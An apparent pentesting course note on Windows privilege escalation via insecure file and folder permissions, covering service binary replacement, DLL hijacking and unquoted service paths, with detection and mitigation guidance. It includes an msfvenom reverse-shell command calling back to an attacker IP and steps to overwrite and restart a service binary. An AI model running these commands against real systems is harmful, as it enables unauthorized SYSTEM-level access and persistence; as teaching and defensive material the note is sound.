---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.26 Insecure Permissions"
---

# 26 - Insecure File and Folder Permissions

## Executive Summary

Insecure file and folder permissions represent one of the most foundational and frequently encountered vulnerabilities leading to local privilege escalation within Microsoft Windows environments. When critical system directories, service executables, dynamic-link libraries (DLLs), or essential configuration files are inadvertently configured with overly permissive Discretionary Access Control Lists (DACLs), standard unprivileged users are granted the ability to modify, overwrite, or replace them. 

When a higher-privileged context—such as the `NT AUTHORITY\SYSTEM` account or a Local Administrator—subsequently executes or interacts with the compromised file, the attacker's malicious code is executed with those elevated privileges. This attack vector relies purely on misconfigurations rather than exploiting complex memory corruption vulnerabilities.

## Theoretical Foundation

The Windows operating system employs a robust, object-centric security model based on Security Identifiers (SIDs) and Access Control Lists (ACLs). 

- **Security Descriptor:** Every securable object in Windows has an associated security descriptor containing an owner, a primary group, a System Access Control List (SACL, used for logging and auditing), and a Discretionary Access Control List (DACL).
- **DACL:** The DACL is the core of authorization. It contains a list of Access Control Entries (ACEs). Each ACE explicitly specifies whether a particular trustee (a user, group, or logon session) is allowed or denied specific access rights to the object.
- **Access Rights:** These rights range from standard rights like `FILE_GENERIC_READ`, `FILE_GENERIC_WRITE`, and `FILE_GENERIC_EXECUTE`, to highly specific rights like `DELETE`, `WRITE_DAC` (the ability to change the permissions), and `WRITE_OWNER` (the ability to take ownership of the object).

Vulnerabilities manifest when broad groups such as `BUILTIN\Users`, `Everyone`, or `Authenticated Users` are granted excessive permissions (like `Modify`, `Write`, or `FullControl`) on sensitive directories or directly on executable binaries utilized by privileged services.

## Architecture and ASCII Diagram

```text
+--------------------------------------------------------------------+
|                Insecure Permissions Escalation Flow                |
|                                                                    |
|  +-----------------------+           +--------------------------+  |
|  |   Low Privilege User  |           |   Windows Service Mgr    |  |
|  |  (BUILTIN\Users)      |           |   (NT AUTHORITY\SYSTEM)  |  |
|  +-----------+-----------+           +-------------+------------+  |
|              |                                     |               |
|              | (1) Overwrite Binary                |               |
|              v                                     |               |
|  +-----------------------+                         |               |
|  |   C:\App\Service.exe  | <-----------------------+               |
|  |  [DACL: Users=WRITE]  |    (2) Service Starts / Executes File   |
|  |  *Malicious Payload*  |                                         |
|  +-----------------------+                                         |
|                                                                    |
|              +-------------------------------------+               |
|              | Result: Payload executes as SYSTEM! |               |
|              +-------------------------------------+               |
+--------------------------------------------------------------------+
```

## Prerequisites and Environment Setup

To successfully exploit insecure permissions, an attacker requires:

1. **Initial Access:** Shell access or code execution on the target Windows machine operating as a low-privileged standard user.
2. **Reconnaissance Capabilities:** The ability to enumerate file system permissions to identify a vulnerable file or directory where they possess write or modify permissions.
3. **Privileged Execution Context:** The vulnerable file or folder must be actively utilized, executed, or loaded by a higher-privileged process, service, or scheduled task.

Key utilities for discovering these misconfigurations include `icacls.exe`, `accesschk.exe` (from the Sysinternals suite), and comprehensive enumeration scripts like `WinPEAS` or `PowerUp.ps1`.

## Detailed Exploitation Walkthrough

### Scenario 1: Direct Modification of a Service Executable

This is the most direct and reliable method. If an attacker discovers that they can overwrite a `.exe` file that operates as a Windows Service, they can gain SYSTEM privileges upon the next restart of that service.

**Step 1: Vulnerability Discovery**

Upload `accesschk.exe` to the target system and search for excessively permissive settings on executables located within common application directories.

```cmd
# Check for permissions granted to the standard 'Users' group
C:\temp> accesschk.exe -uwcqv "Users" *

# Check specific directories for write access
C:\temp> accesschk.exe -uwdqs "Users" "C:\Program Files\"
```

An example of a vulnerable output indicating that the `BUILTIN\Users` group has Read/Write (`RW`) access to a service binary:

```text
C:\Program Files\VulnerableApp\BackendService.exe
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

**Step 2: Binary Backup**

Before replacing the legitimate executable, it is vital to back it up. This ensures the service can be restored to normal operation post-exploitation, avoiding application crashes that might alert administrators.

```cmd
copy "C:\Program Files\VulnerableApp\BackendService.exe" C:\temp\BackendService_backup.exe
```

**Step 3: Payload Generation and Replacement**

Generate a custom malicious executable using tools like `msfvenom` or a custom C/C++ compiler. The payload could be a reverse shell or a command to add the current user to the local Administrators group.

```bash
# On the attacking machine, generate a reverse shell executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o BackendService.exe
```

Upload the payload to the target and aggressively overwrite the original binary.

```cmd
# On the target machine
copy /y C:\temp\BackendService.exe "C:\Program Files\VulnerableApp\BackendService.exe"
```

**Step 4: Trigger Execution**

If the low-privileged user has the rights to restart the service (which can be verified using `accesschk.exe -ucqv <ServiceName>`), they can trigger the payload immediately. Otherwise, they must wait for a system reboot or an administrator to restart the service naturally.

```cmd
sc stop VulnerableService
sc start VulnerableService
```

### Scenario 2: Insecure Folder Permissions leading to DLL Hijacking

Even if the primary executable is properly secured (e.g., owned by Administrator with strict DACLs), insecure permissions on the *folder* containing the executable can lead to privilege escalation.

If a highly privileged process attempts to load a DLL and searches the directory where the executable resides, an attacker with write access to that directory can drop a maliciously crafted DLL. If the DLL does not natively exist in that folder but is requested by the application (due to Windows DLL search order), the attacker's DLL will be loaded and executed within the context of the privileged process.

### Scenario 3: Unquoted Service Paths

This vulnerability occurs when a service executable path contains spaces and is not enclosed in quotation marks within the registry.

**Example Vulnerable Path:** `C:\Program Files\My App\service.exe`

When the Service Control Manager (SCM) attempts to start this service, it parses the path ambiguously. It will attempt to execute every string sequence before a space as an executable, appending `.exe`. 

The SCM search order will be:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe`

If the attacker has write access to the root `C:\` directory or the `C:\Program Files\` directory, they can drop a malicious binary named `Program.exe` or `My.exe`. The SCM will execute the attacker's binary as SYSTEM before ever reaching the legitimate service executable.

## Advanced Techniques & Bypasses

1. **Abusing WRITE_OWNER:** If a user possesses `WRITE_OWNER` permissions over a file, they cannot directly modify the file. However, they can change the file's ownership to themselves. Once they are the owner, they inherently have the right to modify the DACL, allowing them to grant themselves `FullControl` and subsequently overwrite the file.
2. **Abusing WRITE_DAC:** Similarly, if an attacker has `WRITE_DAC` permissions, they can directly modify the security descriptor of the object to inject an ACE granting themselves write access, without needing to assume ownership first.

## Indicators of Compromise (IoCs) & Detection Engineering

### Log Sources and Telemetry

1. **Windows Security Event Logs:**
   - `Event ID 4670` (Permissions on an object were changed): This event is critical for detecting abuse of `WRITE_DAC` or `WRITE_OWNER`.
   - `Event ID 4656` / `4663` (Object Access): If auditing is enabled for critical directories, these events can highlight unusual write access by non-administrative users.
   - `Event ID 7040` (Service Control Manager): Indicates that the start type of a service was changed, or `Event ID 7036` indicating service state changes (stopping/starting frequently).

2. **Sysmon (System Monitor):**
   - `Event ID 11` (FileCreate): Monitor for executables or DLLs being dropped into directories like `C:\` or `C:\Program Files\` by standard user processes.
   - `Event ID 1` (Process Creation): Monitor for child processes (like `cmd.exe` or `powershell.exe`) spawning from legitimate service executables, indicating successful hijacking.

### Mitigation Strategies

1. **Strict DACL Enforcement:** Regularly audit and enforce strict permissions on all system directories, particularly third-party application folders installed outside of default Windows protections.
2. **Enforce Quoting:** Ensure all service paths and scheduled task paths containing spaces are explicitly enclosed in double quotes.
3. **Automated Auditing:** Deploy configuration management tools (like SCCM, Ansible, or Group Policy) to continuously enforce baseline permissions and revert unauthorized modifications.

## Chaining Opportunities

- **Persistence:** Overwriting legitimate binaries that execute frequently or automatically at startup is a highly effective and common persistence mechanism used by Advanced Persistent Threats (APTs).
- **Defense Evasion:** By hijacking legitimate, trusted service executables, malicious activity may blend seamlessly with normal system operations, avoiding immediate detection by rudimentary behavioral security monitoring.

## Related Notes
- [[25 - Abusing SeBackupPrivilege SeRestorePrivilege]]
- [[29 - COM Object Hijacking]]
- [[28 - Named Pipe Impersonation]]
